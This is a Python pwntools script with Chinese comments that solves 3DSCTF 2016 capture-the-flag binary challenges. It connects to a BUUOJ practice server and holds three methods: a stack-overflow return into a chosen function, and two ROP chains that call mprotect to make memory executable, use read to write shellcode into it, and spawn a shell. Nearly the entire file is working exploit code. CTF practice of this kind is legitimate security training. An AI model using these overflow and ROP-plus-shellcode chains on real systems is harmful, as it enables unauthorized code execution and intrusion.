from pwn import *

r = remote('node5.buuoj.cn', 28341)

# 方法1
func_addr = 0x80489A0
ret_addr = 0x804E6A0
param_a1 = 0x308cd64f
param_a2 = 0x195719d1

payload = b'a' * 0x38 + p32(func_addr) + p32(ret_addr) + p32(param_a1) + p32(param_a2)

# elf = ELF(r'../get_started_3dsctf_2016')

r.sendline(payload)
# r.sendlineafter('Qual a palavrinha magica?\n', payload)
r.interactive()


'''
# 方法2：mprotect函数修改内存权限，写入shellcode执行命令 （使用pop三个寄存器）
from pwn import *
r = process(r'./get_started_3dsctf_2016')
#context(os = 'linux', arch = 'i386', log_level = 'debug' , endian = 'little')  # 小端序，linux系统，32位架构,debug

# 用mprotect函数修改完权限后，再调用read函数将pwntools生成的shellcode代码注入到addr中，之后再将read函数返回地址写为addr地址，调用shellcode，获得shell
mprotect_addr = 0x0806EC80
buf_start_addr = 0x80eb000
buf_size = 0x400
buf_permit = 0x7
read_addr = 0x806E140
main_addr = 0x8048A20
pop_edi_esi_ebx = 0x8063adb

#gdb.attach(r)

# 0x08063adb : pop edi ; pop esi ; pop ebx ; ret
payload = b'a' * 0x38 + p32(mprotect_addr) + p32(pop_edi_esi_ebx) + p32(buf_start_addr) + p32(buf_size) + p32(buf_permit)
payload += p32(read_addr) + p32(buf_start_addr) + p32(0) + p32(buf_start_addr) + p32(0x100)
r.sendline(payload)

shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
r.sendline(shellcode)
r.interactive()
'''

'''
# 方法3：mprotect函数修改内存权限，写入shellcode执行命令 （不使用pop寄存器，控制执行流程返回main函数引发第二次溢出）
from pwn import *
r = process(r'./not_the_same_3dsctf_2016')
context.log_level = 'debug'
mprotect_addr = 0x806ED40
buf_start_add = 0x80eb000
buf_size = 0x1000
buf_premit = 0x7
main_addr = 0x80489E0
read_addr = 0x806E200

#gdb.attach(r)

# 使用mprotect函数修改完内存之后，再返回main函数引发第二次溢出
payload = b'A' * 0x2D + p32(mprotect_addr) + p32(main_addr) + p32(buf_start_add) + p32(buf_size) + p32(buf_premit)
r.sendline(payload)
# 第二次溢出使用read函数向目标内存地址写入shellcode
payload2 = b'A' * 0x2D + p32(read_addr) + p32(buf_start_add) + p32(0) + p32(buf_start_add) + p32(0x600)
r.sendline(payload2)
# 因为刚刚调用了read函数等待输入，这里输入shellcode
shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux')
r.sendline(shellcode)
r.interactive()

'''